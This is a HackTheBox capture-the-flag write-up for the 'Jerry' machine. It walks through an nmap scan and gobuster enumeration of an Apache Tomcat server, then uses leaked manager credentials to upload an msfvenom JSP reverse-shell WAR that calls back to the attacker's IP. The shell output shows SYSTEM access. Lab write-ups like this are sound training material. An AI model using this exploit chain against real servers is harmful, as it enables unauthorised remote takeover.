# HackTheBox - Jerry Writeup 6/11/2025

---

## 1. Scanning for open ports and services
 ```bash
sudo nmap -sV -sC 10.129.180.210
[sudo] password for ech0: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-11 22:01 EDT
Nmap scan report for 10.129.180.210
Host is up (1.4s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-title: Apache Tomcat/7.0.88
|_http-favicon: Apache Tomcat
|_http-server-header: Apache-Coyote/1.1

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 187.44 seconds
```
---

## 2. Enumeration

After navigating to the webserver to verify that it was up, I used gobuster to look for hidden directories, the scan however did not complete before I cancelled it but some interesting directories did show up:

```bash
 gobuster dir -u http://10.129.180.210:8080 -w directory-list-2.3-medium.txt                         
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.180.210:8080
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/docs                 (Status: 302) [Size: 0] [--> /docs/]
/examples             (Status: 302) [Size: 0] [--> /examples/]
/manager              (Status: 302) [Size: 0] [--> /manager/]
/http%3A%2F%2Fwww     (Status: 400) [Size: 0]
```
I thought the /manager directory would give me some good info so I navigated to the directory

```bash
http://10.129.180.210/manager
```
I was prompt to sign in, not having any creds I closed the prompt and was redirected to this url
```bash
http://10.129.180.210/manager/status
```
Some important information was on this page, including credentials for signing in to the manager page.

---

## 3. Exploitation

I created a payload using msfvenom after going through the website and seeing that the .war extension was used for uploads. I did some addtional research online to see how to craft the payload.

```bash
msfvenom -p java/jsp_shell_reverse_tcp lhost=10.10.16.29 lport=80 -f war -o revshell.war
Payload size: 1094 bytes
Final size of war file: 1094 bytes
Saved as: revshell.war
```                                                                                           

```bash
(ech0㉿kali)-[~]
└─$ ls
Desktop  Documents  Downloads  Music  Pictures  Public  revshell.war  SecLists-master  Templates  test.txt  Videos
```
After verifying the payload was made, I deployed it on the webserver manager and loaded Metasploit to catch the shell.

```bash
msfconsole
```

After setting my options I ran the exploit and caught a shell

```bash
:\apache-tomcat-7.0.88>whoami
whoami
nt authority\system

Directory of C:\Users\Administrator\Desktop

06/19/2018  07:09 AM    <DIR>          .
06/19/2018  07:09 AM    <DIR>          ..
06/19/2018  07:09 AM    <DIR>          flags
               0 File(s)              0 bytes
               3 Dir(s)   2,416,873,472 bytes free

C:\Users\Administrator\Desktop>  


C:\Users\Administrator\Desktop cd flags
 cd flags

C:\Users\Administrator\Desktop\flags>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 0834-6C04

 Directory of C:\Users\Administrator\Desktop\flags

06/19/2018  07:09 AM    <DIR>          .
06/19/2018  07:09 AM    <DIR>          ..
06/19/2018  07:11 AM                88 2 for the price of 1.txt
     

C:\Users\Administrator\Desktop\flags>type "2 for the price of 1.txt"
type "2 for the price of 1.txt"
user.txt
[User flag here]

root.txt
[Root flag here]
```

## References:
- https://www.ethicaltechsupport.com/blog-post/apache-tomcat-war-backdoor/

## Tools
- Nmap
- Gobuster
- Metasploit
